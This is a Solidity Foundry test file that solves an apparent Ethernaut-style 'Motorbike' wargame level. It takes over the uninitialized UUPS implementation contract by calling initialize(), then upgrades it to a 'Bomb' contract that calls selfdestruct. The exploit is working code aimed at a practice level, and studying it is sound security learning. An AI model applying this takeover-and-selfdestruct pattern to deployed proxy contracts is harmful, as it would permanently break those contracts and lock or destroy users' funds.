// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "forge-std/Test.sol";
import "../src/levels/Motorbike/Motorbike.sol";
import "../src/levels/Motorbike/MotorbikeFactory.sol";

contract Bomb {
    function kill() external {
        selfdestruct(payable(address(0)));
    }
}

contract MotorbikeTest is Test {
    MotorbikeFactory public factory;
    Motorbike public instance;
    address public player = address(0x01);

    function setUp() public {
        factory = new MotorbikeFactory();
        instance = Motorbike(payable(factory.createInstance(player)));

        assertEq(Engine(address(instance)).upgrader(), address(factory));
        assertEq(Engine(address(instance)).horsePower(), uint256(1_000));
    }

    function testMotorbikeAttack() public {
        Engine engine = Engine(factory.engines(address(instance)));

        assertEq(engine.upgrader(), address(0));
        assertEq(engine.horsePower(), uint256(0));

        vm.prank(player);
        engine.initialize();

        assertEq(engine.upgrader(), player);
        assertEq(engine.horsePower(), uint256(1_000));

        Bomb bomb = new Bomb();
        bytes memory data = abi.encodeWithSelector(bomb.kill.selector);

        vm.prank(player);
        assertEq(data.length, 4);
        engine.upgradeToAndCall(address(bomb), data);
        //   assertEq(factory.validateInstance(payable(address(instance)), player), true);
    }
}
